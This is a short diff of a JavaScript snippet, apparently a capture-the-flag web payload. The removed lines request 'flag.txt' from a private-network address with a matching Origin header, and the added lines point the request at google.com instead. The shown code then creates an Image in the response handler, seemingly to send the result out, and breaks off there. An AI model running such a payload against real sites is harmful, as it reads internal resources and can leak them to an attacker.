@@ -1,6 +1,6 @@
 var xhr = new XMLHttpRequest();
-xhr.open("GET", "http://192.168.20.100:8080/flag.txt");
-xhr.setRequestHeader("Origin", "192.168.20.100:8080");
+xhr.open("GET", "http://www.google.com");
+xhr.setRequestHeader("Origin", "www.google.com");
 xhr.onreadystatechange = function () {
 	if (xhr.readyState === 4) {
 		var img = new Image();
